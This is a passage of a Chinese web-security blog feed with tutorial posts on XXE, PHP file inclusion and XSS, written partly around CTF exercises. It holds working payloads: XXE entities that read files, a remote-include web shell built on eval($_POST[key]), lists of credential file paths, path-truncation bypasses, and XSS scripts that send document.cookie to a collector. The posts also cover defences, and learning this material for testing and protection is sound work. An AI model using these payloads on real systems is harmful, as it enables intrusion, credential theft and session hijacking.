class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;! DOCTYPE ANY[</span><br><span class="line">&lt;! ENTITY XXe SYSTEM&quot;http://192.168.1.1:81/mark4z5&quot;&gt;</span><br><span class="line">&lt;x&gt;&amp; xxe;&lt;/x&gt;</span><br><span class="line">EOF; Sdata=simplexml_1oad_string($xml); print_r($data);</span><br></pre></td></tr></table></figure><p>该例子是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p><h2 id="0x03-实例"><a href="#0x03-实例" class="headerlink" title="0x03 实例"></a>0x03 实例</h2><p><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a><br><img src="/images/xxe3.png" alt><br>源码：<br><img src="/images/xxe4.png" alt><br>抓包发现客户端以json形式发送了数据，服务端返回了客户端的内容<br><img src="/images/xxe5.png" alt><br>利用XXE外部实体<br><img src="/images/xxe6.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file://home/ctf/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;xxe&gt;&amp;file;&lt;/xxe&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-XXE漏洞修复与防御"><a href="#0x04-XXE漏洞修复与防御" class="headerlink" title="0x04 XXE漏洞修复与防御"></a>0x04 XXE漏洞修复与防御</h2><h4 id="1-使用开发语言提供的禁用外部实体的方法"><a href="#1-使用开发语言提供的禁用外部实体的方法" class="headerlink" title="1.使用开发语言提供的禁用外部实体的方法"></a>1.使用开发语言提供的禁用外部实体的方法</h4><p>PHP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>JAVA:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><h4 id="2-过滤用户提交的XML数据"><a href="#2-过滤用户提交的XML数据" class="headerlink" title="2.过滤用户提交的XML数据"></a>2.过滤用户提交的XML数据</h4><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p><p>参考资料：<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-XML基础&quot;&gt;&lt;a href=&quot;#0x00-XML基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 XML基础&quot;&gt;&lt;/a&gt;0x00 XML基础&lt;/h2&gt;&lt;p&gt;可扩展标记语言（英語：Extensible Markup Language，
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="XXE" scheme="https://kevens10.github.io/tags/XXE/"/>
    
      <category term="XML" scheme="https://kevens10.github.io/tags/XML/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://kevens10.github.io/articles/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://kevens10.github.io/articles/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html</id>
    <published>2019-11-09T10:59:18.000Z</published>
    <updated>2019-11-10T03:00:26.793Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-文件包含与文件包含漏洞"><a href="#0x00-文件包含与文件包含漏洞" class="headerlink" title="0x00 文件包含与文件包含漏洞"></a>0x00 文件包含与文件包含漏洞</h2><p>文件包含是指，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。文件包含还有另外一个名称，那就是代码重用。我们若是需要修改页面，只需要修改一个头部代码文件就可以了，其他上万个页面将会全部对应改变。</p><p>文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动念包含在版务器的文件，从而导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含LFI和远程文件包含RFI两种形式</p><h2 id="0x01-文件包含函数"><a href="#0x01-文件包含函数" class="headerlink" title="0x01 文件包含函数"></a>0x01 文件包含函数</h2><p>文件包含的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vrequire()</span><br><span class="line"></span><br><span class="line">require_once()</span><br><span class="line"></span><br><span class="line">include()</span><br><span class="line"></span><br><span class="line">include_once()</span><br></pre></td></tr></table></figure><p>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；require函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h2 id="0x02-漏洞产生原因"><a href="#0x02-漏洞产生原因" class="headerlink" title="0x02 漏洞产生原因"></a>0x02 漏洞产生原因</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，用户可以操作一些敏感文件，文件泄露和恶意代码注入，可以被用户控制，包含其他恶意文件，执行非预期的代码<br>当包含文件在服务器本地上，就形成本地文件包含，当包含的文件在第三方服务器是，就形成可远程文件包含。<br>例子：</p><p><img src="/images/baohanloudong4.png" alt></p><p>filename参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改filename的值，执行非预期的操作。</p><h2 id="0x03-本地文件包含"><a href="#0x03-本地文件包含" class="headerlink" title="0x03 本地文件包含"></a>0x03 本地文件包含</h2><p>本地文件包含LFI也即Local File Inclusion，其特性是可包含任意类型的文件，当被包含的文件书写符合php书写规范，即（&lt;？php..…….代码.……？&gt;或&lt;？.…代码..？&gt;）时，不论文件后缀是什么，都可以解析其中的php代码，当书写规范不符合时，则以文本形式输出。<br>测试：</p><p><img src="/images/baohanloudong4.png" alt></p><p><img src="/images/baohanloudong1.png" alt><br>执行结果：<br><img src="/images/baohanloudong2.png" alt></p><h2 id="0x04-远程文件包含"><a href="#0x04-远程文件包含" class="headerlink" title="0x04 远程文件包含"></a>0x04 远程文件包含</h2><p>远程文件包含RFI也即Remote File Inclusion，其基本原理与本地文件包含LFI类似，区别只是被包含的文件由原来的本地文件路径变为远程文件路径。其特性是可包含任意类型的文件，并且如果被包含文件中有类似”&lt;？php…（省略号为php代码）？&gt;”或<br>“&lt;？.…（省略号为php代码）？&gt;”这2种形式的字符串，则在包含时会执行字符串中的PHP代码。<br>有两个关键函数：<br>allow_url_fopen = On（是否允许打开远程文件）<br>allow_url_include = On（是否允许include/require远程文件）</p><p>前提：需要开启allow_url_fopen，默认关闭。<br>示例：include.php<br><img src="/images/baohanloudong4.png" alt><br>新建file.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo &quot;hello,hacker&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问<a href="http://www.xxxx.com/include.php?file=http://www.xxxx.com/file.txt" target="_blank" rel="noopener">http://www.xxxx.com/include.php?file=http://www.xxxx.com/file.txt</a><br>执行结果将输出hello world。</p><h2 id="0x05-文件包含利用"><a href="#0x05-文件包含利用" class="headerlink" title="0x05 文件包含利用"></a>0x05 文件包含利用</h2><h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a>读取敏感信息</h3><p>通过目录遍历可以获取到系统中其他文件的内容：<br><img src="/images/baohanloudong3.png" alt></p><h4 id="常见敏感信息路径"><a href="#常见敏感信息路径" class="headerlink" title="常见敏感信息路径"></a>常见敏感信息路径</h4><h5 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br></pre></td></tr></table></figure><h5 id="Linux-Unix系统"><a href="#Linux-Unix系统" class="headerlink" title="Linux/Unix系统"></a>Linux/Unix系统</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure><h3 id="session文件包含漏洞-待续"><a href="#session文件包含漏洞-待续" class="headerlink" title="session文件包含漏洞(待续)"></a>session文件包含漏洞(待续)</h3><p>利用条件：</p><p>session的存储位置可以获取。</p><ol><li>通过phpinfo的信息可以获取到session的存储位置。</li></ol><p>通过phpinfo的信息，获取到session.save_path为/var/lib/php/session：</p><p>获取到session的存储位置</p><ol start="2"><li>通过猜测默认的session存放位置进行尝试。</li></ol><p>如linux下默认存储在/var/lib/php/session目录下：</p><p>默认存储</p><p>session中的内容可以被控制，传入恶意代码。</p><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><p>新建file.txt保存在远程服务器上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure><p>如果目标网站存在远程包含漏洞，则可以通过访问：<a href="http://www.xx1.com/index.php?file=http://www.xx2.com/file.txt" target="_blank" rel="noopener">http://www.xx1.com/index.php?file=http://www.xx2.com/file.txt</a><br>会在服务器根目录下生产一个shell.php内容为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   eval($_POST[key]);?&gt;</span><br></pre></td></tr></table></figure><h3 id="利用php协议进行包含"><a href="#利用php协议进行包含" class="headerlink" title="利用php协议进行包含"></a>利用php协议进行包含</h3><p>(参考《PHP伪协议》）<br>data:　　php5.2以后版本<br>php://input　　需要开启allow_url_include<br>例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;%00</span><br></pre></td></tr></table></figure><h3 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h3><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马file.jpg，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure><p>访问URL：<a href="http://www.xxx.com/index.php?file=./file.jpg" target="_blank" rel="noopener">http://www.xxx.com/index.php?file=./file.jpg</a><br>生成shell.php。</p><h2 id="0x06-绕过方法"><a href="#0x06-绕过方法" class="headerlink" title="0x06 绕过方法"></a>0x06 绕过方法</h2><h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&apos;filename&apos;] . &quot;.html&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。<br>绕过方式：在最后加？<br>payload：<br><a href="http://www.xxx.com/index.php?filename=http://xxx2/file.txt" target="_blank" rel="noopener">http://www.xxx.com/index.php?filename=http://xxx2/file.txt</a>?</p><h3 id="井号绕过"><a href="#井号绕过" class="headerlink" title="井号绕过"></a>井号绕过</h3><p><a href="http://www.xxx.com/index.php?filename=http://xxx2/file.txt%23" target="_blank" rel="noopener">http://www.xxx.com/index.php?filename=http://xxx2/file.txt%23</a></p><h3 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h3><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    Include  $_GET[&apos;page&apos;].&quot;.php&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="00截断包含"><a href="#00截断包含" class="headerlink" title="%00截断包含"></a>%00截断包含</h4><p>新建file.jpg，写入内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure><p>　　这样的话比如上传一个file.jpg图片马，则访问<a href="http://www.xxx.com/file.jpg" target="_blank" rel="noopener">http://www.xxx.com/file.jpg</a><br>时，访问的是file.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问<a href="http://www.xxx.com/file.jpg%00" target="_blank" rel="noopener">http://www.xxx.com/file.jpg%00</a></p><h4 id="使用长目录截断"><a href="#使用长目录截断" class="headerlink" title="使用长目录截断"></a>使用长目录截断</h4><p>常用绕过方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">././././././././././././././etc/passwd</span><br><span class="line"></span><br><span class="line">////////////////////////////etc/passwd</span><br><span class="line"></span><br><span class="line">../a/etc/passwd/../a/etc/passwd/../a/etc/passwd</span><br></pre></td></tr></table></figure><p>在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。所以成功绕过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-文件包含与文件包含漏洞&quot;&gt;&lt;a href=&quot;#0x00-文件包含与文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x00 文件包含与文件包含漏洞&quot;&gt;&lt;/a&gt;0x00 文件包含与文件包含漏洞&lt;/h2&gt;&lt;p&gt;文件包含是指，服务器执行PH
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="PHP" scheme="https://kevens10.github.io/tags/PHP/"/>
    
      <category term="后端" scheme="https://kevens10.github.io/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="文件包含漏洞" scheme="https://kevens10.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞</title>
    <link href="https://kevens10.github.io/articles/XSS%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://kevens10.github.io/articles/XSS%E6%BC%8F%E6%B4%9E.html</id>
    <published>2019-11-07T12:08:51.000Z</published>
    <updated>2019-11-07T15:17:05.035Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。</p><h2 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h2><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。</p><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>会把用户输入的数据”存储”在服务器端，也叫”持久性xss”，常见留言板等可以提交展示用户输入内容的功能点。</p><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS 的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。</p><p>反射型和存储型，是与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。</p><h2 id="0x03-危害"><a href="#0x03-危害" class="headerlink" title="0x03 危害"></a>0x03 危害</h2><pre><code>cookie劫持（窃取cookie）后台增删改文章等操作（类似于csrf骗取用户点击，利用js模拟浏览器发包，借助xmlhttprequest类）钓鱼，利用xss构造出一个登录框，骗取用户账户密码。Xss蠕虫（利用xss漏洞进行传播）修改网页代码利用网站重定向获取用户信息（如浏览器信息，IP地址等）</code></pre><h2 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h2><p>通常有一些方式可以测试网站是否有正确处理特殊字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert (vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;img src=&quot;http://888.888.com/999.png&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;div style=&quot;height:expression(alert(&apos;XSS&apos;),1)&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h5 id="XSS探针"><a href="#XSS探针" class="headerlink" title="XSS探针"></a>XSS探针</h5><p>我们可以在测试xss的位置写入以下代码，查看页面源码，观察哪些代码被过滤或者转义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure><p>xss探针可检测出网站有没有对xss漏洞做最基础的防御。</p><h2 id="0x05-常见-XSS-注入点"><a href="#0x05-常见-XSS-注入点" class="headerlink" title="0x05 常见 XSS 注入点"></a>0x05 常见 XSS 注入点</h2><p>HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；<br>HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；<br>JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；<br>富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本；</p><h2 id="0x06-实例"><a href="#0x06-实例" class="headerlink" title="0x06 实例"></a>0x06 实例</h2><h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><p>cookie.php后端代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php</span><br><span class="line">$cookie=$_GET[&apos;cookie&apos;];</span><br><span class="line">$log=fopen(&quot;cookie. txt&quot;,&quot;a&quot;); </span><br><span class="line">fwrite($1og,$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($1og);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这是用于接收cookie，并将其写入cookie.txt文件中。</p><p>在存在xss漏洞的地方，插入以下代码，便可以将cookie发送到cookie.php，并且将cookie参数传递进去，写入文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script〉</span><br><span class="line">new Image (). src=&quot;http://localhost/sspt/XSS/cookie.php?cookie=&quot;+document. cookie;</span><br><span class="line">&lt;/script〉</span><br></pre></td></tr></table></figure><p>常用获取cookie的js代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://localhost/cspt/XSS_cookie.php?cookie=&apos;+document.cookie&quot;&gt;&lt;/img&gt;</span><br><span class="line">&lt;script&gt;new Image().src=&quot;http://localhost/cspt/XSS/xss_cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>提交之后，本地cookie.txt文件中就会写入cookie值。<br><img src="/images/xss1.png" alt></p><h4 id="利用xss篡改网页"><a href="#利用xss篡改网页" class="headerlink" title="利用xss篡改网页"></a>利用xss篡改网页</h4><p>前提：网站必须存在存储型xss漏洞，并且会将结果返回到页面上。<br>这样我们就可以插入一段js代码，作用在于获取网站源码中的标签，然后修改其中的属性值，达到修改网页的效果。<br>编写javascript脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var objs=document. getElementsByTagName(&quot;a&quot;);</span><br><span class="line">var b=objs. length ;</span><br><span class="line">for(var a=0;a&lt;b;a++)&#123;</span><br><span class="line">objs[a]. href=&quot;http://www.bilibili.com&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将以下语句插入存在存储型xss漏洞的网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&apos;text/javascript&apos; src=&apos;http://localhost/cspt/XSS/test.js&apos;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以发现存在该漏洞的网页上所有的链接都变成了<a href="http://www.bilibili.com" target="_blank" rel="noopener">www.bilibili.com</a></p><h4 id="利用xss获取用户信息"><a href="#利用xss获取用户信息" class="headerlink" title="利用xss获取用户信息"></a>利用xss获取用户信息</h4><p>xss获取用户信息，运用最多的还是获取cookie信息，但除此之外，还可以获取用户浏览器版本、外网IP地址、浏览器安装的插件类型等等。以下列举了利用xss获取的客户端用户信息（包含但不仅限于以下几种）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(navigator.userAgent);读取userAgent内容</span><br><span class="line">alert(document.cookie);读取用户cookie内容</span><br><span class="line">利用java环境，调用java Applet的接口获取客户端本地IP</span><br></pre></td></tr></table></figure><h2 id="0x07-常用绕过技巧"><a href="#0x07-常用绕过技巧" class="headerlink" title="0x07 常用绕过技巧"></a>0x07 常用绕过技巧</h2><p>转换大小写<br>大小写混写<br>双引号改单引号<br>引号改为/<br>用全角字符<br>使用javascript伪协议<br>使用回车、空格等特殊字符<br>在css的style中使用/**/注释符<br>使用字符编码<br>利用事件触发xss</p><h5 id="绕过XSS-filter"><a href="#绕过XSS-filter" class="headerlink" title="绕过XSS filter"></a>绕过XSS filter</h5><p>绕过xss filter的前提在于，xss filter使用了黑名单，并且没有过滤完全。<br>前提一：如果过滤了”《script》”字符串,但没有过滤”&lt;”、”&gt;”字符，则可以使用javascript:[code]伪协议的形式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&apos;test&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>前提二：过滤了《script》，且只过滤一次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>前提三：没有正确处理空格、回车等字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">Cript:</span><br><span class="line">Alert(/xss/)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>参考资料：<a href="https://thief.one/2017/05/31/1/" target="_blank" rel="noopener">https://thief.one/2017/05/31/1/</a><br><a href="https://zh.wikipedia.org/w/index.php?title=%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC&amp;action=edit&amp;section=3" target="_blank" rel="noopener">https://zh.wikipedia.org/w/index.php?title=%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC&amp;action=edit&amp;section=3</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="XSS" scheme="https://kevens10.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>大端小端存储模式</title>
    <link href="https://kevens10.github.io/articles/%E5%A4%A7%E7%AB%AF%E5%B0%8F%E7%AB%AF%E5%AD%98%E5%82%A8%E6%A8%A1%E5%BC%8F.html"/>
    <id>https://kevens10.github.io/articles/%E5%A4%A7%E7%AB%AF%E5%B0%8F%E7%AB%AF%E5%AD%98%E5%82%A8%E6%A8%A1%E5%BC%8F.html</id>
    <published>2019-10-31T08:12:16.000Z</published>
    <updated>2019-10-31T08:32:05.772Z</updated>
    
